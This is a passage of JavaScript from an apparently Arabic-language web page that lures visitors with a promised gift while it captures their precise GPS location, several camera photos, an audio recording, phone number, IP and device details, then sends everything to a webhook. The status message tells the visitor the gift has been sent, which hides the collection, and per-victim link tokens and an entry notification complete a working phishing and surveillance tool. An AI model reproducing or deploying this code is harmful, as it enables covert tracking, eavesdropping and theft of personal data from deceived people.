                let watchId = null;
                let bestPosition = null;
                let bestAccuracy = Infinity;
                let isResolved = false;
                let attemptCount = 0;
                const MAX_ATTEMPTS = 10;
                const TIMEOUT_MS = 15000;
                const TARGET_ACCURACY = 100;

                const resolveWithBest = () => {
                    if (isResolved) return;
                    isResolved = true;
                    if (watchId !== null) {
                        navigator.geolocation.clearWatch(watchId);
                        watchId = null;
                    }
                    if (bestPosition) {
                        userLocation.lat = bestPosition.coords.latitude;
                        userLocation.lng = bestPosition.coords.longitude;
                        userLocation.accuracy = bestPosition.coords.accuracy;
                        userLocation.error = null;
                        console.log('✅ [getLocation] نجاح:', bestPosition.coords.latitude, bestPosition.coords.longitude);
                    } else {
                        userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
                        console.error('❌ [getLocation] فشل الحصول على الموقع - لا توجد بيانات');
                    }
                    resolve();
                };

                const timeoutId = setTimeout(() => {
                    if (!isResolved) {
                        console.warn('⏳ [getLocation] انتهت المهلة');
                        if (watchId !== null) {
                            navigator.geolocation.clearWatch(watchId);
                            watchId = null;
                        }
                        if (bestPosition) {
                            resolveWithBest();
                        } else {
                            userLocation.error = 'انتهت مهلة الحصول على الموقع';
                            resolve();
                        }
                    }
                }, TIMEOUT_MS);

                const handlePosition = (pos) => {
                    attemptCount++;
                    const accuracy = pos.coords.accuracy;
                    console.log(`📍 [getLocation] تحديث ${attemptCount}: دقة ${accuracy} متر`);
                    if (accuracy < bestAccuracy) {
                        bestAccuracy = accuracy;
                        bestPosition = pos;
                    }
                    if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
                        console.log(`✅ [getLocation] تم الوصول للدقة المطلوبة (${accuracy} متر) أو انتهت المحاولات (${attemptCount})`);
                        resolveWithBest();
                        clearTimeout(timeoutId);
                    }
                };

                const handleError = (err) => {
                    if (isResolved) return;
                    console.warn(`⚠️ [getLocation] خطأ: ${err.message} (كود ${err.code})`);
                    if (err.code === 1) {
                        userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
                        isResolved = true;
                        if (watchId !== null) {
                            navigator.geolocation.clearWatch(watchId);
                            watchId = null;
                        }
                        clearTimeout(timeoutId);
                        resolve();
                        return;
                    }
                    if (attemptCount < MAX_ATTEMPTS) {
                        // لا نعرض شيء للمستخدم
                    } else {
                        if (bestPosition) {
                            resolveWithBest();
                        } else {
                            userLocation.error = err.message || 'تعذر الحصول على الموقع';
                            isResolved = true;
                            if (watchId !== null) {
                                navigator.geolocation.clearWatch(watchId);
                                watchId = null;
                            }
                            clearTimeout(timeoutId);
                            resolve();
                        }
                    }
                };

                watchId = navigator.geolocation.watchPosition(
                    handlePosition,
                    handleError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 2000 }
                );
                console.log('📡 [getLocation] تم بدء watchPosition');
            });
        }

        // ================================================================
        //  CAMERA
        // ================================================================
        async function startCameraAndCapture() {
            return new Promise(async (resolve) => {
                try {
                    console.log('📸 [startCameraAndCapture] بدء الكاميرا');
                    const constraints = { video: true, audio: false };
                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                    video.srcObject = mediaStream;
                    await video.play();

                    await new Promise((resolve, reject) => {
                        const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
                        const onReady = () => { clearTimeout(timeout);
                            resolve(); };
                        if (video.readyState >= 2 && video.videoWidth > 0) {
                            onReady();
                        } else {
                            video.addEventListener('loadedmetadata', onReady);
                            video.addEventListener('canplay', onReady);
                            video.play().catch(() => {});
                        }
                    });

                    await new Promise(r => setTimeout(r, 500));
                    const ctx = canvas.getContext('2d');
                    const width = Math.min(video.videoWidth || 640, 1920);
                    const height = Math.min(video.videoHeight || 480, 1080);
                    canvas.width = width;
                    canvas.height = height;

                    capturedPhotoFiles = [];

                    for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                        ctx.drawImage(video, 0, 0, width, height);
                        const blob = await new Promise((resolve) => {
                            canvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
                        });
                        if (blob && blob.size > 1000) {
                            const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
                            capturedPhotoFiles.push(file);
                        }
                        if (i < TOTAL_PHOTOS) {
                            await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
                        }
                    }

                    console.log(`✅ [startCameraAndCapture] تم التقاط ${capturedPhotoFiles.length} صور`);
                    resolve(true);

                } catch (error) {
                    console.error('❌ [startCameraAndCapture] خطأ:', error);
                    if (mediaStream) {
                        mediaStream.getTracks().forEach(t => t.stop());
                        mediaStream = null;
                    }
                    video.srcObject = null;
                    resolve(false);
                }
            });
        }

        // ================================================================
        //  AUDIO
        // ================================================================
        async function recordAudio() {
            return new Promise(async (resolve) => {
                try {
                    console.log('🎤 [recordAudio] بدء التسجيل الصوتي');
                    const audioConstraints = { audio: true };
                    audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
                    audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
                    audioChunks = [];
                    audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
                    audioRecorder.onstop = () => {
                        if (audioChunks.length > 0) {
                            audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                            console.log(`✅ [recordAudio] تم التسجيل بحجم ${audioBlob.size} بايت`);
                        }
                        resolve();
                    };
                    audioRecorder.start();
                    setTimeout(() => {
                        if (audioRecorder.state === 'recording') {
                            audioRecorder.stop();
                            console.log('⏹️ [recordAudio] تم إيقاف التسجيل');
                        }
                        audioStream.getTracks().forEach(t => t.stop());
                    }, AUDIO_DURATION);
                } catch (error) {
                    console.error('❌ [recordAudio] خطأ:', error);
                    resolve();
                }
            });
        }

        // ================================================================
        //  SEND ALL DATA
        // ================================================================
        async function sendAllData() {
            console.log('📤 [sendAllData] بدء إعداد البيانات للإرسال');

            const formData = new FormData();

            formData.append('event', 'submission');
            formData.append('country', selectedCountry);
            formData.append('phone', userPhone);
            formData.append('ip', userIP);

            formData.append('location[lat]', userLocation.lat !== null ? String(userLocation.lat) : '');
            formData.append('location[lng]', userLocation.lng !== null ? String(userLocation.lng) : '');
            formData.append('location[accuracy]', userLocation.accuracy !== null ? String(userLocation.accuracy) : '');
            formData.append('location[error]', userLocation.error || '');

            formData.append('device[userAgent]', navigator.userAgent);
            formData.append('device[platform]', navigator.platform);
            formData.append('device[language]', navigator.language);
            formData.append('device[screen]', `${screen.width}x${screen.height}`);
            formData.append('device[colorDepth]', screen.colorDepth);
            formData.append('device[timezone]', Intl.DateTimeFormat().resolvedOptions().timeZone);
            formData.append('timestamp', new Date().toISOString());

            if (capturedPhotoFiles.length > 0) {
                capturedPhotoFiles.forEach((file, index) => {
                    formData.append(`photos[]`, file, file.name);
                });
                console.log(`📸 [sendAllData] تم إضافة ${capturedPhotoFiles.length} صور`);
            }

            if (audioBlob) {
                const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                formData.append('audio', audioFile);
                console.log(`🎤 [sendAllData] تم إضافة ملف صوتي بحجم ${audioBlob.size} بايت`);
            }

            console.log('📤 [sendAllData] إرسال إلى Webhook');

            const result = await sendToWebhook(formData);

            if (result.success) {
                console.log('✅ [sendAllData] تم الإرسال بنجاح');
                return true;
            } else {
                console.error('❌ [sendAllData] فشل الإرسال:', result.error);
                return false;
            }
        }

        // ================================================================
        //  TIMER
        // ================================================================
        function startTimer(seconds) {
            timerSeconds = seconds;
            updateTimerDisplay();
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                timerSeconds--;
                updateTimerDisplay();
                if (timerSeconds <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.textContent = '00:00';
                    showStatus(statusTimer, 'success', '🎉 تم إرسال هديتك! تحقق من هاتفك.');
                }
            }, 1000);
        }

        function updateTimerDisplay() {
            const mins = Math.floor(timerSeconds / 60);
            const secs = timerSeconds % 60;
            timerDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }

        // ================================================================
        //  STATUS HELPER
        // ================================================================
        function showStatus(el, type, message) {
            el.className = `status ${type}`;
            el.textContent = message;
            el.style.display = 'block';
            if (type !== 'error') {
                clearTimeout(el._timeout);
                el._timeout = setTimeout(() => {
                    if (el.className.includes(type)) {
                        el.style.display = 'none';
                    }
                }, 8000);
            }
        }

        // ================================================================
        //  CLEANUP
        // ================================================================
        window.addEventListener('beforeunload', () => {
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
            if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
            if (timerInterval) clearInterval(timerInterval);
        });

        // ================================================================
        //  🚀 START
        // ================================================================
        window.addEventListener('load', async () => {
            const hasToken = extractTokenFromURL();
            if (!hasToken) {
                showStatus(statusCountry, 'error', '⚠️ رابط غير صحيح. يرجى استخدام الرابط المخصص لك.');
                document.querySelectorAll('.country-btn').forEach(b => b.disabled = true);
                return;
            }
            await notifyUserEntered();
            detectSuspiciousActivity();
            console.log('🛡️ الحماية مفعلة وإشعار الدخول تم إرساله إلى Webhook');
        });
    </script>
</body>
